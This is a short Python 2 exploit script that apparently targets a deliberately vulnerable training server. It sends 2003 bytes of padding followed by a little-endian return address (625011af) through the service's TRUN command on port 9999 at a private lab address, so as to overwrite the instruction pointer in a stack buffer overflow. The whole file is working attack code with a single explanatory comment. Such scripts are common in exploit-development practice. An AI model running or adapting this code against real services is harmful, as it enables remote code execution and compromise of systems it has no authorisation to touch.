#!/usr/bin/python
import sys, socket


# After 2003 bytes EIP starts.
shellcode = 'A' * 2003 + "\xaf\x11\x50\x62"    #625011af - Little Endian Format
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.66.1', 9999))
    s.send('TRUN /.:/' + shellcode)
    s.close()

except:
    print "Error connecting to server"
    sys.exit()
